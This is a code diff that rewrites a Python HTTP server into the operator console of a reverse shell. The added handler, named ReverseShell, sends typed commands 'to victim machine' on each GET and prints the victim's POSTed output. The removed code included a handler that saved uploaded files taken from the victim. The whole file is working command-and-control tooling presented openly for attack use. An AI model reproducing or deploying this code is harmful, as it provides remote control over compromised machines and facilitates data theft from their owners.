@@ -1,55 +1,34 @@
-import requests
 import socketserver
 import http.server
-from colorama import Fore, Back, Style
+import cgi
 
 PORT = 8080
 
-QUIT = False
 
+class ReverseShell(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        command = input(">> ")
 
-class MyHandler(http.server.BaseHTTPRequestHandler):
-    def do_GET(s):
-        command = input(Fore.YELLOW + ">> ")
-        print(Style.RESET_ALL)
-        # print(type(command))
-        s.send_response(200)
-        s.send_header("Content-type", "text/html")
-        s.end_headers()
-        s.wfile.write(command.encode())
+        # boilerplate http
+        self.send_response(200)
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
 
-    def do_POST(s):
+        # send command to victim machine
+        self.wfile.write(command.encode())
 
-        if s.path == '/store':  # Check whether /store is appended or not
-            try:
-                ctype, pdict = cgi.parse_header(
-                    s.headers.getheader('content-type'))
-                if ctype == 'multipart/form-data':
-                    fs = cgi.FieldStorage(fp=s.rfile, headers=s.headers, environ={
-                                          'REQUEST_METHOD': 'POST'})
-                else:
-                    print("[-] Unexpected POST request")
-                # Here file is the key to hold the actual file
-                fs_up = fs['file']
-                # Create new file and write contents into this file
-                with open('/root/Desktop/demo.txt', 'wb') as o:
-                    o.write(fs_up.file.read())
-                    s.send_response(200)
-                    s.end_headers()
-            except Exception as e:
-                print(e)
-            return
-        s.send_response(200)
-        s.end_headers()
+    def do_POST(self):
+        self.send_response(200)
+        self.end_headers()
         # Define the length which means how many bytes the HTTP POST data contains
-        length = int(s.headers['Content-Length'])
-        # Read then print the posted data
-        postVar = s.rfile.read(length).decode()
-        print(Fore.GREEN + postVar)
-        print(Style.RESET_ALL)
+        length = int(self.headers['Content-Length'])
+
+        # Read post then print the posted data
+        postVar = self.rfile.read(length).decode()
+        print(postVar)
 
 
-with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+with socketserver.TCPServer(("", PORT), ReverseShell) as httpd:
     print("serving at port", PORT)
     try:
         httpd.serve_forever()
